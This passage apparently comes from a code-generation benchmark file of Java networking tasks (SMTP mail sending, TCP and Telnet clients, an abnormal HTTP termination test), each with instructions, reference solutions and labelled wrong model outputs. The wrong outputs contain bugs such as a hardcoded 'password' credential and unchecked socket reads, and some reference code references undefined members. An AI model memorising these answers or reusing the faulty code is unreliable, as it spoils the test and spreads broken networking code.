SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, null, random);\n            mSSLSocketFactory = sslContext.getSocketFactory();\n        } catch (Exception e) {\n            Log.e(TAG, \"Failed to initialize SSL socket factory\", e);\n            mSSLSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n        }\n        mDelayedRestartHandler = new Handler();\n    }\n\n    public static Socket connectSocket(String host, int port) throws IOException {\n        if (host == null || host.isEmpty()) {\n            throw new IllegalArgumentException(\"Host cannot be null or empty\");\n        }\n        return connectSocketNoProxy(host, port);\n    }\n\n    private static Socket connectSocketNoProxy(String host, int port) throws IOException {\n        Socket socket = new Socket();\n        socket.connect(new InetSocketAddress(host, port), SERVER_CONNECT_TIMEOUT_MILLIS);\n        socket.setSoTimeout(SERVER_CONNECT_TIMEOUT_MILLIS);\n        return socket;\n    }\n\n    private static Socket connectSocketViaHttpProxyConnectMethod(String host, int port, SocketAddress proxyAddress) throws IOException {\n        Proxy proxy = new Proxy(Proxy.Type.HTTP, proxyAddress);\n        Socket socket = new Socket(proxy);\n        socket.connect(new InetSocketAddress(host, port), HTTP_PROXY_CONNECT_TRANSFORM_TIMEOUT_MILLIS);\n        socket.setSoTimeout(HTTP_PROXY_CONNECT_TIMEOUT_MILLIS);\n\n        // Implement HTTP CONNECT method here\n        return socket;\n    }\n\n    private void tryEnableSni(SSLSocket socket, String hostname) {\n        try {\n            ((SSLSocket) socket).setEnabledProtocols(socket.getSupportedProtocols());\n            if (hostname != null && !hostname.isEmpty()) {\n                ((SSLSocket) socket).setHostname(hostname);\n            }\n        } catch (Exception e) {\n            Log.w(TAG, \"Failed to enable SNI on socket\", e);\n        }\n    }\n\n    private void tryEnableSessionTickets(SSLSocket socket) {\n        try {\n            socket.getSession().getCreationTime(); // This is a workaround to check if session tickets are supported\n        } catch (Exception e) {\n            Log.w(TAG, \"Failed to enable session tickets\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 562,
    "Instruction": "Task Description: Implement a Java class that handles sending emails with attachments via SMTP protocol using socket programming.\n\nClass Description: The SendMailJob class provides functionality to connect to an SMTP server, compose and send emails with attachments, and properly handle the email sending process including connection management and error handling.\n\nAttributes:\n- socket: [Socket] - The socket connection to the SMTP server\n- in: [BufferedReader] - Input stream for reading server responses\n- out: [OutputStream] - Output stream for sending commands to the server\n- out64: [Base64OutputStream] - Base64 encoded output stream for sending attachments\n- connectedToMailServer: [boolean] - Flag indicating connection status\n- mailServer: [String] - SMTP server address\n- fromAddress: [String] - Sender's email address\n- boundary: [String] - MIME boundary for multipart messages\n- recipientString: [String] - Comma-separated recipient addresses\n- mailSubject: [String] - Email subject line\n- mailBody: [String] - Email body content\n- errorDialogTitle: [String] - Title for error dialogs\n\nMethods:\n- SendMailJob([ProgressDialog, MainFrame, FileSet, String, String, String]) -> [void] - Constructor that initializes email parameters and configurations\n- openConnection() -> [void] - Establishes connection with SMTP server and initializes streams\n- sendBody() -> [void] - Sends email headers and body content to the server\n- sendAttachment([AbstractFile]) -> [void] - Encodes and sends file attachments to the server\n- closeConnection() -> [void] - Closes all connections and releases resources\n- readWriteLine([String]) -> [void] - Sends a command to server and reads response\n- writeLine([String]) -> [void] - Writes a line to the output stream\n- splitRecipientString([String, List<String>]) -> [String] - Parses recipient string into individual addresses",
    "Canonical_solution": "import com.mucommander.commons.file.AbstractFile;\nimport com.mucommander.commons.io.StreamUtils;\nimport com.mucommander.commons.io.base64.Base64OutputStream;\nimport com.mucommander.conf.MuConfigurations;\nimport com.mucommander.conf.MuPreference;\nimport com.mucommander.conf.MuPreferences;\nimport com.mucommander.job.FileJobState;\nimport com.mucommander.text.Translator;\nimport com.mucommander.ui.dialog.DialogAction;\nimport com.mucommander.ui.dialog.file.ProgressDialog;\nimport com.mucommander.ui.main.MainFrame;\n\nimport java.io.*;\nimport java.net.Socket;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.StringTokenizer;\nimport java.util.Vector;\n\npublic class SendMailJob {\n\n    private Socket socket;\n    private BufferedReader in;\n    private OutputStream out;\n    private Base64OutputStream out64;\n    private boolean connectedToMailServer;\n    private String mailServer;\n    private String fromAddress;\n    private String boundary;\n    private String recipientString;\n    private String mailSubject;\n    private String mailBody;\n    private String errorDialogTitle;\n\n    public SendMailJob(ProgressDialog progressDialog, MainFrame mainFrame, FileSet filesToSend, String recipientString, String mailSubject, String mailBody) {\n        this.boundary = \"mucommander\" + System.currentTimeMillis();\n        this.recipientString = recipientString;\n        this.mailSubject = mailSubject;\n        this.mailBody = mailBody + \"\\n\\n\" + \"Sent by muCommander - http://www.mucommander.com\\n\";\n        this.mailServer = MuConfigurations.getPreferences().getVariable(MuPreference.SMTP_SERVER);\n        this.fromAddress = MuConfigurations.getPreferences().getVariable(MuPreference.MAIL_SENDER_ADDRESS);\n        this.errorDialogTitle = Translator.get(\"email_dialog.error_title\");\n    }\n\n    private void openConnection() throws IOException {\n        this.socket = new Socket(mailServer, MuConfigurations.getPreferences().getVariable(MuPreference.SMTP_PORT, MuPreferences.DEFAULT_SMTP_PORT));\n        this.in = new BufferedReader(new InputStreamReader(socket.getInputStream(), \"UTF-8\"));\n        this.out = socket.getOutputStream();\n        this.out64 = new Base64OutputStream(out, true);\n        this.connectedToMailServer = true;\n    }\n\n    private void sendBody() throws IOException {\n        readWriteLine(\"HELO muCommander\");\n        readWriteLine(\"MAIL FROM: \" + fromAddress);\n\n        List<String> recipients = new Vector<String>();\n        recipientString = splitRecipientString(recipientString, recipients);\n        int nbRecipients = recipients.size();\n        for (int i = 0; i < nbRecipients; i++)\n            readWriteLine(\"RCPT TO: <\" + recipients.get(i) + \">\");\n        readWriteLine(\"DATA\");\n        writeLine(\"MIME-Version: 1.0\");\n        writeLine(\"Subject: \" + this.mailSubject);\n        writeLine(\"From: \" + this.fromName + \" <\" + this.fromAddress + \">\");\n        writeLine(\"To: \" + recipientString);\n        writeLine(\"Content-Type: multipart/mixed; boundary=\\\"\" + boundary + \"\\\"\");\n        writeLine(\"\\r\\n--\" + boundary);\n        writeLine(\"Content-Type: text/plain; charset=\\\"utf-8\\\"\\r\\n\");\n        writeLine(this.mailBody + \"\\r\\n\\r\\n\");\n        writeLine(\"\\r\\n--\" + boundary);\n    }\n\n    private void sendAttachment(AbstractFile file) throws IOException {\n        InputStream fileIn = null;\n        try {\n            String mimeType = MimeTypes.getMimeType(file);\n            if (mimeType == null)\n                mimeType = \"application/octet-stream\";\n            writeLine(\"Content-Type:\" + mimeType + \"; name=\" + file.getName());\n            writeLine(\"Content-Disposition: attachment;filename=\\\"\" + file.getName() + \"\\\"\");\n            writeLine(\"Content-transfer-encoding: base64\\r\\n\");\n            fileIn = setCurrentInputStream(file.getInputStream());\n            StreamUtils.copyStream(fileIn, out64);\n            out64.writePadding();\n            writeLine(\"\\r\\n--\" + boundary);\n        } finally {\n            if (fileIn != null)\n                fileIn.close();\n        }\n    }\n\n    private void closeConnection() {\n        try {\n            socket.close();\n            in.close();\n            out64.close();\n        } catch (Exception e) {\n        }\n    }\n\n    private void readWriteLine(String s) throws IOException {\n        out.write((s + \"\\r\\n\").getBytes(\"UTF-8\"));\n        in.readLine();\n    }\n\n    private void writeLine(String s) throws IOException {\n        out.write((s + \"\\r\\n\").getBytes(\"UTF-8\"));\n    }\n\n    private String splitRecipientString(String recipientsStr, List<String> recipients) {\n        StringBuilder newRecipientsSb = new StringBuilder();\n        StringTokenizer st = new StringTokenizer(recipientsStr, \",;\");\n        String rec;\n        int pos1, pos2;\n        while (st.hasMoreTokens()) {\n            rec = st.nextToken().trim();\n            if ((pos1 = rec.indexOf('<')) != -1 && (pos2 = rec.indexOf('>', pos1 + 1)) != -1)\n                recipients.add(rec.substring(pos1 + 1, pos2));\n            else\n                recipients.add(rec);\n\n            newRecipientsSb.append(rec);\n            if (st.hasMoreTokens())\n                newRecipientsSb.append(\", \");\n        }\n        return newRecipientsSb.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.Base64;\nimport java.util.List;\n\npublic class SendMailJob {\n    private Socket socket;\n    private BufferedReader in;\n    private OutputStream out;\n    private Base64OutputStream out64;\n    private boolean connectedToMailServer;\n    private String mailServer;\n    private String fromAddress;\n    private String boundary = \"===\" + System.currentTimeMillis() + \"===\";\n    private String recipientString;\n    private String mailSubject;\n    private String mailBody;\n    private String errorDialogTitle;\n\n    public SendMailJob(String mailServer, String fromAddress, String recipientString, String mailSubject, String mailBody) {\n        this.mailServer = mailServer;\n        this.fromAddress = fromAddress;\n        this.recipientString = recipientString;\n        this.mailSubject = mailSubject;\n        this.mailBody = mailBody;\n        this.errorDialogTitle = \"Email Error\";\n        openConnection();\n    }\n\n    private void openConnection() {\n        try {\n            socket = new Socket(mailServer, 25);\n            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            out = socket.getOutputStream();\n            connectedToMailServer = true;\n\n            int responseCode = Integer.parseInt(in.readLine().substring(0, 3));\n            if (responseCode != 220) {\n                throw new IOException(\"SMTP server connection failed.\");\n            }\n            readWriteLine(\"EHLO \" + InetAddress.getLocalHost().getHostName());\n            readWriteLine(\"AUTH LOGIN\");\n            readWriteLine(Base64.getEncoder().encodeToString(fromAddress.getBytes()));\n            readWriteLine(Base64.getEncoder().encodeToString(\"password\".getBytes()));\n        } catch (Exception e) {\n            handleException(e);\n        }\n    }\n\n    private void sendBody() throws IOException {\n        writeLine(\"MAIL FROM:<\" + fromAddress + \">\");\n        for (String recipient : splitRecipient(recipientString)) {\n            writeLine(\"RCPT TO:<\" + recipient + \">\");\n        }\n        writeLine(\"DATA\");\n\n        StringBuilder header = new StringBuilder();\n        header.append(\"From: \").append(fromAddress).append(\"\\r\\n\");\n        header.append(\"To: \").append(recipientString).append(\"\\r\\n\");\n        header.append(\"Subject: \").append(mailSubject).append(\"\\r\\n\");\n        header.append(\"MIME-Version: 1.0\\r\\n\");\n        header.append(\"Content-Type: multipart/mixed; boundary=\\\"\").append(boundary).append(\"\\\"\\r\\n\");\n        header.append(\"\\r\\n--\").append(boundary).append(\"\\r\\n\");\n        header.append(\"Content-Type: text/plain; charset=utf-8\\r\\n\");\n        header.append(\"Content-Transfer-Encoding: 7bit\\r\\n\");\n        header.append(\"\\r\\n\").append(mailBody).append(\"\\r\\n\");\n        writeLine(header.toString());\n\n        sendAttachment(new AbstractFile());\n    }\n\n    private void sendAttachment(AbstractFile file) throws IOException {\n        if (file.exists()) {\n            writeLine(\"\\r\\n--\" + boundary + \"\\r\\n\");\n            writeLine(\"Content-Type: application/octet-stream; name=\\\"\" + file.getName() + \"\\\"\\r\\n\");\n            writeLine(\"Content-Transfer-Encoding: base64\\r\\n\");\n            writeLine(\"Content-Disposition: attachment; filename=\\\"\" + file.getName() + \"\\\"\\r\\n\");\n            writeLine(\"\\r\\n\");\n\n            out64 = new Base64OutputStream(out);\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            FileInputStream fis = new FileInputStream(file.getAbsolutePath());\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                out64.write(buffer, 0, bytesRead);\n            }\n            fis.close();\n            out64.flush();\n            writeLine(\"\\r\\n--\" + boundary + \"--\\r\\n.\\r\\n\");\n        }\n    }\n\n    private void closeConnection() {\n        try {\n            if (out64 != null) out64.close();\n            if (in != null) in.close();\n            if (socket != null && !socket.isClosed()) socket.close();\n            connectedToMailServer = false;\n        } catch (IOException e) {\n            handleException(e);\n        }\n    }\n\n    private void readWriteLine(String command) throws IOException {\n        writeLine(command);\n        String line;\n        while ((line = in.readLine()) != null) {\n            System.out.println(line);\n            if (!line.startsWith(\"-\")) break;\n        }\n    }\n\n    private void writeLine(String line) throws IOException {\n        out.write((line + \"\\r\\n\").getBytes());\n        out.flush();\n    }\n\n    private List<String> splitRecipient(String recipients) {\n        return List.of(recipients.split(\",\"));\n    }\n\n    private void handleException(Exception e) {\n        System.err.println(errorDialogTitle + \": \" + e.getMessage());\n        closeConnection();\n    }\n}\n\nclass AbstractFile {\n    private String path;\n\n    public AbstractFile() {\n        this.path = \"example.txt\";\n    }\n\n    public boolean exists() {\n        return new File(path).exists();\n    }\n\n    public String getName() {\n        return new File(path).getName();\n    }\n\n    public String getAbsolutePath() {\n        return new File(path).getAbsolutePath();\n    }\n}\n\nclass Base64OutputStream extends FilterOutputStream {\n    private Base64.Encoder encoder = Base64.getEncoder();\n\n    public Base64OutputStream(OutputStream out) {\n        super(out);\n    }\n\n    @Override\n    public void write(int b) throws IOException {\n        byte[] input = {(byte) b};\n        byte[] encoded = encoder.encode(input);\n        out.write(encoded);\n    }\n\n    @Override\n    public void write(byte[] b, int off, int len) throws IOException {\n        byte[] chunk = new byte[len];\n        System.arraycopy(b, off, chunk, 0, len);\n        byte[] encoded = encoder.encode(chunk);\n        out.write(encoded);\n    }\n}\n```"
  },
  {
    "Task_id": 564,
    "Instruction": "Task Description: Write a function that tests abnormal request termination behavior in a client-server communication scenario using TCP sockets. The function should simulate sending a malformed HTTP request with incorrect content length and verify proper connection handling.\n\nFunction Description: The function establishes a TCP connection to a server, sends an HTTP POST request with intentionally incorrect Content-Length header, immediately closes the streams, and verifies if the completion listener is called within a timeout period. This tests the server's handling of abruptly terminated requests.\n\nInput: \n- None (uses class-level DefaultServer.getDefaultServerAddress() and completionListenerCalledLatch)\n- Implicit input through class attributes:\n  - DefaultServerAddress: Server endpoint address\n  - completionListenerCalledLatch: CountDownLatch for synchronization\n  - completionListenerCalled: boolean flag to verify listener invocation\n\nOutput: \n- None (void return type)\n- Side effects:\n  - Throws IOException if socket operations fail\n  - Throws InterruptedException if await is interrupted\n  - Asserts completionListenerCalled is true\n  - Closes socket resources in finally block",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.TimeUnit;\n\npublic void testAbnormalRequestTermination() throws IOException, InterruptedException {\n    Socket socket = new Socket();\n    socket.connect(DefaultServer.getDefaultServerAddress());\n    try {\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < 10000; ++i) {\n            sb.append(\"hello world\\r\\n\");\n        }\n        String request = \"POST / HTTP/1.1\\r\\nHost:localhost\\r\\nContent-Length:\" + sb.length() + 100 + \"\\r\\n\\r\\n\" + sb.toString();\n        OutputStream outputStream = socket.getOutputStream();\n\n        outputStream.write(request.getBytes(\"US-ASCII\"));\n        socket.getInputStream().close();\n        outputStream.close();\n\n        completionListenerCalledLatch.await(5, TimeUnit.SECONDS);\n        Assert.assertTrue(completionListenerCalled);\n    } finally {\n        IoUtils.safeClose(socket);\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nvoid testAbnormalRequestTermination() throws IOException, InterruptedException {\n    Socket socket = new Socket();\n    try {\n        socket.connect(new InetSocketAddress(DefaultServer.getDefaultServerAddress(), 8080));\n        OutputStream out = socket.getOutputStream();\n        String malformedRequest = \"POST / HTTP/1.1\\r\\n\"\n                + \"Host: localhost\\r\\n\"\n                + \"Content-Length: -5\\r\\n\" // Invalid Content-Length\n                + \"\\r\\n\";\n        out.write(malformedRequest.getBytes(StandardCharsets.US_ASCII));\n        out.flush();\n\n        out.close(); // Immediately close stream\n\n        boolean latchResult = completionListenerCalledLatch.await(3, TimeUnit.SECONDS);\n        if (!latchResult) {\n            throw new TimeoutException(\"Completion listener not called within timeout\");\n        }\n\n        if (!completionListenerCalled) {\n            throw new AssertionError(\"Completion listener was not invoked\");\n        }\n    } finally {\n        try {\n            socket.close();\n        } catch (IOException e) {\n            // Ignore\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 567,
    "Instruction": "Task Description: Implement a TCP client class in Java that handles network communication with a server, including connection management, data transmission, and reception with proper error handling and resource management.\n\nClass Description: The TcpClient class establishes and maintains a TCP connection to a specified server, sends data packets, and receives responses. It uses a custom protocol with 8-byte headers (4 bytes for type, 4 bytes for length) followed by the message body. The class runs network operations on a dedicated background thread and provides callback mechanisms for received data.\n\nAttributes:\n- TAG: String - Tag for logging purposes\n- PACKAGE_HEAD_LENGTH: int - Fixed length of packet header (8 bytes)\n- receiveListener: ReceiveListener - Callback interface for received data\n- hostip: String - Server IP address to connect to\n- port: int - Server port number\n- socketClient: Socket - The TCP socket instance\n- handler: Handler - Handler for background thread operations\n- receiveThread: Thread - Thread for receiving data\n\nMethods:\n- TcpClient() -> void - Constructor that initializes the background thread and attempts connection\n- tryConnect() -> void - Internal method to attempt server connection in a loop\n- connect() -> boolean - Establishes socket connection to server (returns success status)\n- send(byte[] data) -> void - Sends data to the server (runs on background thread)\n- onReceive(ReceiveListener receiveListener) -> void - Sets the receive callback listener\n- destroy() -> void - Cleans up resources and stops all network operations\n- closeAll() -> void - Safely closes socket and releases resources\n- startReceive() -> void - Starts the data receiving thread\n- getLengthFromHeadByte(byte[] b) -> int - Extracts message length from header bytes\n- getTypeFromHeadByte(byte[] b) -> int - Extracts message type from header bytes\n\nNested Classes:\n- Receiver implements Runnable - Background thread implementation for continuous data reception",
    "Canonical_solution": "import android.os.Handler;\nimport android.os.HandlerThread;\nimport android.util.Log;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.Arrays;\n\npublic class TcpClient {\n    private static final String TAG = TcpClient.class.getSimpleName();\n    private static final int PACKAGE_HEAD_LENGTH = 8;\n\n    public interface ReceiveListener {\n        void onReceive(int type, byte[] data);\n    }\n\n    private ReceiveListener receiveListener;\n    private String hostip = \"192.168.3.28\";\n    private int port = 2233;\n    private Socket socketClient;\n    private Handler handler;\n    private Thread receiveThread;\n\n    public TcpClient() {\n        HandlerThread tcpThread = new HandlerThread(\"tcpThread\");\n        tcpThread.start();\n        handler = new Handler(tcpThread.getLooper());\n        tryConnect();\n    }\n\n    private void tryConnect() {\n        handler.post(() -> {\n            while (true) {\n                if (connect()) {\n                    startReceive();\n                    break;\n                }\n            }\n        });\n    }\n\n    private boolean connect() {\n        closeAll();\n        try {\n            socketClient = new Socket();\n            SocketAddress socAddress = new InetSocketAddress(hostip, port);\n            socketClient.connect(socAddress, 5000);\n            Log.i(TAG, \"socket connected successfully\");\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n            return false;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n        return true;\n    }\n\n    public void send(byte[] data) {\n        Log.d(TAG, \"send data len:\" + data.length);\n        handler.post(() -> {\n            try {\n                OutputStream outputStream = socketClient.getOutputStream();\n                outputStream.write(data);\n            } catch (SocketException e) {\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public void onReceive(ReceiveListener receiveListener) {\n        this.receiveListener = receiveListener;\n    }\n\n    public void destroy() {\n        if (receiveThread != null) {\n            receiveThread.interrupt();\n        }\n        closeAll();\n    }\n\n    private void closeAll() {\n        if (socketClient == null || socketClient.isClosed() || !socketClient.isConnected()) {\n            return;\n        }\n        try {\n            socketClient.shutdownInput();\n            socketClient.shutdownOutput();\n            socketClient.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void startReceive() {\n        if (receiveThread != null) {\n            receiveThread.interrupt();\n        }\n        receiveThread = new Thread(new Receiver());\n        receiveThread.start();\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            while (true) {\n                if (receiveThread.isInterrupted()) {\n                    break;\n                }\n                try {\n                    InputStream inputStream = socketClient.getInputStream();\n                    boolean badPackage = false;\n                    int countHeadBytesLength = 0;\n                    byte[] headData = new byte[PACKAGE_HEAD_LENGTH];\n                    while (countHeadBytesLength < PACKAGE_HEAD_LENGTH) {\n                        int result = inputStream.read(headData, countHeadBytesLength, PACKAGE_HEAD_LENGTH - countHeadBytesLength);\n                        if (result == -1) {\n                            badPackage = true;\n                            break;\n                        }\n                        countHeadBytesLength += result;\n                    }\n                    if (badPackage) {\n                        Log.e(TAG, \"badPackage!\");\n                        continue;\n                    }\n                    int packageType = getTypeFromHeadByte(headData);\n                    int packageBodyBytesLength = getLengthFromHeadByte(headData);\n                    Log.d(TAG, \"new data received type:\" + packageType + \" body len:\" + packageBodyBytesLength);\n\n                    int countBodyBytesLength = 0;\n                    byte[] bodyData = new byte[packageBodyBytesLength];\n                    while (countBodyBytesLength < packageBodyBytesLength) {\n                        int result = inputStream.read(bodyData, countBodyBytesLength, packageBodyBytesLength - countBodyBytesLength);\n                        if (result == -1) {\n                            badPackage = true;\n                            break;\n                        }\n                        countBodyBytesLength += result;\n                    }\n                    if (badPackage) {\n                        Log.e(TAG, \"badPackage!\");\n                        continue;\n                    }\n                    if (receiveListener != null) {\n                        receiveListener.onReceive(packageType, bodyData);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                    if (receiveThread.isInterrupted()) {\n                        break;\n                    }\n                    tryConnect();\n                    break;\n                }\n            }\n        }\n    }\n\n    private int getLengthFromHeadByte(byte[] b) throws IOException {\n        if (b.length != 8) {\n            throw new EOFException();\n        }\n        int ch1 = b[4] & 0x00FF;\n        int ch2 = b[5] & 0x00FF;\n        int ch3 = b[6] & 0x00FF;\n        int ch4 = b[7] & 0x00FF;\n        return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));\n    }\n\n    private int getTypeFromHeadByte(byte[] b) throws IOException {\n        if (b.length != 8) {\n            throw new EOFException();\n        }\n        int ch1 = b[0] & 0x00FF;\n        int ch2 = b[1] & 0x00FF;\n        int ch3 = b[2] & 0x00FF;\n        int ch4 = b[3] & 0x00FF;\n        return ((ch1 << 24) + (ch2 << 16) + (ch3 << 8) + (ch4 << 0));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport android.os.Handler;\nimport android.os.Looper;\n\npublic class TcpClient {\n    private static final String TAG = \"TcpClient\";\n    private static final int PACKAGE_HEAD_LENGTH = 8;\n    private ReceiveListener receiveListener;\n    private String hostip;\n    private int port;\n    private Socket socketClient;\n    private Handler handler;\n    private Thread receiveThread;\n\n    public TcpClient(String hostip, int port) {\n        this.hostip = hostip;\n        this.port = port;\n        handler = new Handler(Looper.getMainLooper());\n        tryConnect();\n    }\n\n    private void tryConnect() {\n        new Thread(() -> {\n            while (true) {\n                if (connect()) {\n                    startReceive();\n                    break;\n                }\n                try {\n                    Thread.sleep(5000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }).start();\n    }\n\n    private boolean connect() {\n        try {\n            socketClient = new Socket(hostip, port);\n            socketClient.setSoTimeout(5000);\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public void send(byte[] data) {\n        handler.post(() -> {\n            new Thread(() -> {\n                try {\n                    OutputStream outputStream = socketClient.getOutputStream();\n                    DataOutputStream dataOutputStream = new DataOutputStream(outputStream);\n                    dataOutputStream.writeInt(0); // Placeholder for type\n                    dataOutputStream.writeInt(data.length);\n                    dataOutputStream.write(data);\n                    dataOutputStream.flush();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }).start();\n        });\n    }\n\n    public void onReceive(ReceiveListener receiveListener) {\n        this.receiveListener = receiveListener;\n    }\n\n    public void destroy() {\n        closeAll();\n    }\n\n    private void closeAll() {\n        try {\n            if (socketClient != null) {\n                socketClient.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void startReceive() {\n        receiveThread = new Thread(new Receiver());\n        receiveThread.start();\n    }\n\n    private int getLengthFromHeadByte(byte[] b) {\n        return ((b[4] & 0xFF) << 24) | ((b[5] & 0xFF) << 16) | ((b[6] & 0xFF) << 8) | (b[7] & 0xFF);\n    }\n\n    private int getTypeFromHeadByte(byte[] b) {\n        return ((b[0] & 0xFF) << 24) | ((b[1] & 0xFF) << 16) | ((b[2] & 0xFF) << 8) | (b[3] & 0xFF);\n    }\n\n    private class Receiver implements Runnable {\n        @Override\n        public void run() {\n            byte[] header = new byte[PACKAGE_HEAD_LENGTH];\n            try {\n                InputStream inputStream = socketClient.getInputStream();\n                while (true) {\n                    int bytesRead = 0;\n                    while (bytesRead < PACKAGE_HEAD_LENGTH) {\n                        bytesRead += inputStream.read(header, bytesRead, PACKAGE_HEAD_LENGTH - bytesRead);\n                    }\n                    int length = getLengthFromHeadByte(header);\n                    byte[] body = new byte[length];\n                    bytesRead = 0;\n                    while (bytesRead < length) {\n                        bytesRead += inputStream.read(body, bytesRead, length - bytesRead);\n                    }\n                    if (receiveListener != null) {\n                        handler.post(() -> receiveListener.onDataReceived(getTypeFromHeadByte(header), body));\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                closeAll();\n            }\n        }\n    }\n\n    public interface ReceiveListener {\n        void onDataReceived(int type, byte[] data);\n    }\n}\n```"
  },
  {
    "Task_id": 568,
    "Instruction": "Task Description: Create a Java class that implements TCP client functionality for network communication, including connection management and data transmission.\n\nClass Description: The TelnetTransport class provides TCP client capabilities for establishing connections, sending/receiving data, and managing network resources. It handles multiple IP addresses for a given hostname and provides basic I/O operations.\n\nAttributes:\n- socket: Socket - The underlying TCP socket for network communication\n- is: InputStream - Input stream for receiving data from the server\n- os: OutputStream - Output stream for sending data to the server\n- connected: boolean - Connection status flag indicating whether the client is currently connected\n\nMethods:\n- connect(String hostname, int port) -> void - Establishes a connection to the specified host and port, trying all available IP addresses for the hostname. Throws IOException on connection failure.\n- close() -> void - Closes the connection and releases all network resources. Handles cleanup gracefully.\n- flush() -> void - Flushes the output stream to ensure all buffered data is sent. Throws IOException on failure.\n- isConnected() -> boolean - Returns the current connection status (true if connected).\n- read(byte[] buffer, int start, int len) -> int - Reads data from the input stream into the buffer. Returns number of bytes read or throws IOException if connection is closed.\n- write(byte[] buffer) -> void - Writes the entire buffer to the output stream. Throws IOException on failure.\n- write(int c) -> void - Writes a single byte to the output stream. Throws IOException on failure.\n- tryAllAddresses(Socket sock, String host, int port) -> void - Private helper method that attempts connection to all IP addresses associated with a hostname. Throws SocketTimeoutException if all attempts fail.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.SocketTimeoutException;\nimport java.net.UnknownHostException;\n\npublic class TelnetTransport {\n    private Socket socket;\n    private InputStream is;\n    private OutputStream os;\n    private boolean connected = false;\n\n    public void connect(String hostname, int port) throws IOException {\n        socket = new Socket();\n        tryAllAddresses(socket, hostname, port);\n        connected = true;\n        is = socket.getInputStream();\n        os = socket.getOutputStream();\n    }\n\n    private void tryAllAddresses(Socket sock, String host, int port) throws IOException {\n        InetAddress[] addresses = InetAddress.getAllByName(host);\n        for (InetAddress addr : addresses) {\n            try {\n                sock.connect(new InetSocketAddress(addr, port));\n                return;\n            } catch (SocketTimeoutException ignored) {\n            }\n        }\n        throw new SocketTimeoutException(\"Could not connect; socket timed out\");\n    }\n\n    public void close() {\n        connected = false;\n        if (socket != null) {\n            try {\n                socket.close();\n                socket = null;\n            } catch (IOException e) {\n                System.err.println(\"Error closing socket: \" + e.getMessage());\n            }\n        }\n    }\n\n    public void flush() throws IOException {\n        if (os != null) {\n            os.flush();\n        }\n    }\n\n    public boolean isConnected() {\n        return connected;\n    }\n\n    public int read(byte[] buffer, int start, int len) throws IOException {\n        int n = is.read(buffer, start, len);\n        if (n < 0) {\n            throw new IOException(\"Remote end closed connection.\");\n        }\n        return n;\n    }\n\n    public void write(byte[] buffer) throws IOException {\n        if (os != null) {\n            os.write(buffer);\n        }\n    }\n\n    public void write(int c) throws IOException {\n        if (os != null) {\n            os.write(c);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class TelnetTransport {\n    private Socket socket;\n    private InputStream is;\n    private OutputStream os;\n    private boolean connected;\n\n    public TelnetTransport() {\n        this.connected = false;\n    }\n\n    public void connect(String hostname, int port) throws IOException {\n        tryAllAddresses(new Socket(), hostname, port);\n        this.is = socket.getInputStream();\n        this.os = socket.getOutputStream();\n        this.connected = true;\n    }\n\n    public void close() {\n        if (socket != null) {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n        if (is != null) {\n            try {\n                is.close();\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n        if (os != null) {\n            try {\n                os.close();\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n        connected = false;\n    }\n\n    public void flush() throws IOException {\n        if (os == null) throw new IOException(\"Not connected\");\n        ((BufferedOutputStream) os).flush();\n    }\n\n    public boolean isConnected() {\n        return connected;\n    }\n\n    public int read(byte[] buffer, int start, int len) throws IOException {\n        if (!connected || is == null) throw new IOException(\"Not connected\");\n        int bytesRead = is.read(buffer, start, len);\n        if (bytesRead == -1) {\n            close();\n            throw new IOException(\"Connection closed by remote host\");\n        }\n        return bytesRead;\n    }\n\n    public void write(byte[] buffer) throws IOException {\n        if (!connected || os == null) throw new IOException(\"Not connected\");\n        os.write(buffer);\n    }\n\n    public void write(int c) throws IOException {\n        if (!connected || os == null) throw new IOException(\"Not connected\");\n        os.write(c);\n    }\n\n    private void tryAllAddresses(Socket sock, String host, int port) throws IOException {\n        InetAddress[] addresses = InetAddress.getAllByName(host);\n        for (InetAddress address : addresses) {\n            try {\n       